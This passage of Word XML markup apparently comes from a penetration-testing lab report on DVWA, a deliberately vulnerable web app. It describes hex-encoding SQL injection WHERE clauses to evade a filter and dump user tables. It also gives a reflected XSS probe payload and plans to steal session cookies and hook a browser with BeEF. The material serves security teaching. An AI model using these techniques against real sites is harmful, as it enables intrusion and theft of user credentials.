      </w:pPr>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>9</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Displaying Usernames and hashed Passwords available on User Table</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E328102" w14:textId="44E93DD7" w:rsidR="00ED0E81" w:rsidRPr="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="00ED0E81">
      <w:r>
        <w:t xml:space="preserve">Displaying information specific to </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>particular tables</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> requires using the SQL WHERE clause. Attempting to do this to display data on the dvwa table produces an invalid page</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">[Figure </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>10</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>].</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E9C1D52" w14:textId="2B0C931D" w:rsidR="00220A2F" w:rsidRDefault="00B04B29" w:rsidP="00220A2F">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="77961BAB" wp14:editId="1130C872">
            <wp:extent cx="6829425" cy="3943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6855156" cy="3958207"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2004A1F5" w14:textId="6CD202BD" w:rsidR="00B04B29" w:rsidRDefault="00B04B29" w:rsidP="00B04B29">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="21" w:name="_Hlk67650468"/>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>10</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>I</w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>nvalid Page When SQL WHERE Clause used due to webpage filters</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="21"/>
    <w:p w14:paraId="4FC009CA" w14:textId="336A1FE7" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="00ED0E81">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>To bypass this error, convert any text used in the WHERE clause into hex using the Decoder tab on Burp-suite</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>[Figure 5.1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>].</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0956A209" w14:textId="03313551" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="00ED0E81">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:iCs/>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="11D7137C" wp14:editId="19F0DDC3">
            <wp:extent cx="6812890" cy="4133850"/>
            <wp:effectExtent l="0" t="0" r="762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76497" cy="4172445"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CC7E947" w14:textId="12EDD5D6" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="00ED0E81">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Using Burp’s Decoder To Convert Text To Hex</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01B5C133" w14:textId="131FE4E5" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="00ED0E81">
      <w:r>
        <w:t>Note that everything written in hex begins with 0x and since the browser knows to treat anything it sees with “ox” as a hex character, there is no need for the quotes in the WHERE clause. Now it displays a valid page</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>[Figure 5.1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>].</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C3C9E56" w14:textId="7969ECAD" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="00ED0E81">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6FA999B0" wp14:editId="0FB382A5">
            <wp:extent cx="6800850" cy="3552825"/>
            <wp:effectExtent l="0" t="0" r="0" b="9525"/>
            <wp:docPr id="22" name="Picture 2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websit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810305" cy="3557764"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CD806A2" w14:textId="349F38E2" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="00ED0E81">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Displaying Tables From DVWA Database Using Hex in WHERE Clause</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08885FCB" w14:textId="44B6F6C7" w:rsidR="00ED0E81" w:rsidRPr="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="00ED0E81"/>
    <w:p w14:paraId="72232B5E" w14:textId="0E0498B0" w:rsidR="003E6A7E" w:rsidRPr="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="003E6A7E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:iCs/>
          <w:color w:val="0070C0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00ED0E81">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:iCs/>
          <w:color w:val="0070C0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Cross-Site Scripting XSS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A7B3E1F" w14:textId="6711F474" w:rsidR="00ED0E81" w:rsidRPr="00FF06BD" w:rsidRDefault="00ED0E81" w:rsidP="00ED0E81">
      <w:r w:rsidRPr="00420339">
        <w:t xml:space="preserve">During the exploitation phase, Adelaja </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">will attempt to exploit a </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Reflected Cross-Site Scripting vulnerability to collect a user’s session cookie. For proof of concept purposes, Adelaja will also attempt to exploit a Stored Cross-Site Scripting vulnerability by connecting a test target machine via </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>bEEf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> using a stored XSS attack on the DVWA website</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="350AD84B" w14:textId="77777777" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="00ED0E81">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C189573" w14:textId="31D4F323" w:rsidR="00ED0E81" w:rsidRPr="008D0AB1" w:rsidRDefault="00C5264E" w:rsidP="00ED0E81">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:iCs/>
          <w:color w:val="0070C0"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81" w:rsidRPr="008D0AB1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>1.</w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81" w:rsidRPr="008D0AB1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Checking For Vulnerability</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01DBB015" w14:textId="77777777" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="00ED0E81">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">Before proceeding to develop the exploit. The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>DVWA website</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>tested</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> to find any</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> parameters</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> vulnerable</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> to an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>XSS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> attack before trying to leverage information obtained to get access to the system</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50B1B093" w14:textId="28F52CBD" w:rsidR="003E6A7E" w:rsidRDefault="00ED0E81" w:rsidP="00ED0E81">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>On the XSS Reflected page of DVWA, the normal responses of the application are noted by introducing a name into the textbox displayed</w:t>
      </w:r>
      <w:r w:rsidR="003E6A7E">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>[Figure 6.1]</w:t>
      </w:r>
      <w:r w:rsidR="002C4BC1">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11FF90F9" w14:textId="2997748C" w:rsidR="003E6A7E" w:rsidRPr="003E6A7E" w:rsidRDefault="003E6A7E" w:rsidP="003E6A7E">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:iCs/>
          <w:noProof/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="325EE8D1" wp14:editId="1202443A">
            <wp:extent cx="6829425" cy="30383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6890506" cy="3065568"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="71F22B32" w14:textId="6DD77511" w:rsidR="002C4BC1" w:rsidRDefault="002C4BC1" w:rsidP="00ED0E81">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>6.1</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>DVWA XSS Reflected Page With Displayed Input</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77493D63" w14:textId="7F152D8F" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="003E6A7E">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>The page uses the name provided to form a sentence by appending a “Hello” in front of the value inputted. Instead of a valid name, some special characters mixed with numeric values (</w:t>
      </w:r>
      <w:r w:rsidRPr="00ED0E81">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
        </w:rPr>
        <w:t>“12@4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>) are introduced to notice how the application reacts</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>[Figure 6.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>].</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="529AD082" w14:textId="7A1077A6" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="003E6A7E">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:iCs/>
          <w:noProof/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="64CB1E34" wp14:editId="7303080C">
            <wp:extent cx="6829425" cy="2714625"/>
            <wp:effectExtent l="0" t="0" r="9525" b="952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4935" cy="2724765"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C54C214" w14:textId="0F54B9D5" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="00ED0E81">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>6.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>DVWA XSS Reflected Page With Displayed Input</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5366E6FF" w14:textId="77777777" w:rsidR="006A13EC" w:rsidRDefault="006A13EC" w:rsidP="003E6A7E">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="47397D5E" w14:textId="50B6E109" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="003E6A7E">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>Note that anything put into the textbox will be printed back out with the “Hello” appended. Analyzing how the page presents this information verifies that there is no encoding for special characters in the output and these special characters are displayed right back on the page without any prior processing</w:t>
      </w:r>
      <w:r w:rsidRPr="002358C6">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>[Figure6.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidRPr="002358C6">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>].</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11B6EC8C" w14:textId="498E2AF5" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="003E6A7E">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:iCs/>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6E12E2A6" wp14:editId="4ECCD8B0">
            <wp:extent cx="6944360" cy="3438525"/>
            <wp:effectExtent l="0" t="0" r="8890" b="9525"/>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48464" cy="3440557"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F7B675D" w14:textId="7ACCE672" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="00ED0E81">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>6</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.3</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">DVWA XSS Reflected Page </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Source Code Verifying Lack of Encoding</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="184D63BA" w14:textId="77777777" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="003E6A7E">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">Introducing a name followed by this very simple script code </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>similar to</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00ED0E81">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
        </w:rPr>
        <w:t>Kay&lt;script&gt;alert (‘XSS@)&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38E377DB" w14:textId="34ED6C98" w:rsidR="002358C6" w:rsidRDefault="00ED0E81" w:rsidP="003E6A7E">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00ED0E81">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>will cause the page to execute the script,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> processing it as if it were a part of the HTML code. The browser will interpret the HTML script tag and execute the code inside it</w:t>
      </w:r>
      <w:r w:rsidRPr="00ED0E81">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00ED0E81">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>prompting</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00ED0E81">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> the alert to appear, suggesting that this page is vulnerable to XSS attacks</w:t>
      </w:r>
      <w:r w:rsidRPr="002358C6">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>[Figure6.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidRPr="002358C6">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
      <w:r w:rsidRPr="00ED0E81">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="006A13EC" w:rsidRPr="00ED0E81">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="655C6B95" w14:textId="26292877" w:rsidR="00ED0E81" w:rsidRPr="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="003E6A7E">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="140229E3" wp14:editId="4800BAA8">
            <wp:extent cx="6805295" cy="3038475"/>
            <wp:effectExtent l="0" t="0" r="0" b="952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08805" cy="3040042"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
